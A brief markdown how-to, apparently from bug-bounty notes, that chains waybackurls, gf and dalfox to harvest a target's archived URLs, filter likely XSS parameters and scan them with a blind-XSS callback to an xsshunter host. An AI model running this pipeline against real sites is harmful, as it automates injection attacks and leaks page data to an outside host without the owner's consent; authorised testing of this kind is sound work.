# XSS Automation with Dalfox

* First You Have Install Dalfox, GF and waybackurls

Steps :
```
   1) waybackurls target.com >> tee urls.txt
   2)cat urls.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u |tee Possible_xss.txt 
   3)dalfox file Possible_xss.txt -b xsshunterpyload.xss.ht pipe
```


